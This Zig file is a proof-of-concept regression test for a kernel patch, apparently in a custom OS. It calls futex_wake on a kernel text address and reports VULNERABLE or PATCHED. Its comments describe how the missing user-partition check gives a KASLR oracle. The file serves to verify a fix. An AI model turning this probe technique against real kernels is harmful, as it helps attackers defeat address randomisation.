// PoC for 91f4c1b: sysFutexWake missing user-partition check.
//
// Pre-patch: sysFutexWake resolves the given VA through the current
// process's page table with no user-partition check. The kernel half
// is mapped into every process via global PML4 entries, so a kernel
// VA successfully resolves to a kernel paddr and futex.wake runs on
// it — returning 0 (no waiters on that bucket). Userspace uses the
// differential (0 vs E_BADADDR) as a KASLR oracle and passes arbitrary
// kernel paddrs into futex bucket lookups.
//
// Post-patch: sysFutexWake rejects any addr outside the user partition
// up front and returns E_BADADDR (-7).
//
// Differential: pre-patch prints "VULNERABLE"; post-patch prints "PATCHED".

const lib = @import("lib");
const syscall = lib.syscall;
const arch = @import("builtin").cpu.arch;

fn rawFutexWake(addr: u64, count: u64) i64 {
    return switch (arch) {
        .x86_64 => asm volatile ("syscall"
            : [ret] "={rax}" (-> i64),
            : [num] "{rax}" (@as(u64, @intFromEnum(syscall.SyscallNum.futex_wake))),
              [a0] "{rdi}" (addr),
              [a1] "{rsi}" (count),
            : .{ .rcx = true, .r11 = true, .rdx = true, .memory = true }),
        else => unreachable,
    };
}

pub fn main(_: u64) void {
    // Canonical high-half address inside kernel text. Kernel text is
    // mapped via a global PML4 entry in every process, so resolveVaddr
    // on an unpatched kernel will succeed.
    const kernel_va: u64 = 0xFFFFFFFF80000000;

    const ret = rawFutexWake(kernel_va, 1);

    if (ret == -7) {
        syscall.write("POC-S1: PATCHED (futex_wake kernel_va -> E_BADADDR)\n");
    } else if (ret == 0) {
        syscall.write("POC-S1: VULNERABLE (futex_wake kernel_va -> 0, oracle live)\n");
    } else {
        syscall.write("POC-S1: UNEXPECTED\n");
    }
    syscall.shutdown();
}
